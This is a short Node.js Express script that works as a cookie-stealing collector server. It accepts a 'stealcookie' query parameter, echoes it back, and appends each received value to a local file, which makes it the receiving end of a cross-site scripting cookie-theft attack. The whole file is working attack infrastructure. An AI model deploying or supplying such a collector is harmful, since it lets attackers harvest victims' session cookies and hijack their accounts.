const express = require('express')
const app = express()
const port = 3000
const fs = require('fs');

app.get('/', (req, res) => {
    res.send( req.query.stealcookie);
    fs.writeFile("./stealcookie.txt", req.query.stealcookie, {flag:'a'}, (err) => {
        if (err) throw err;
        console.log("The file as been saved!");
    });
})

app.listen(port, () => console.log(`Example app listening on port ${port}!`))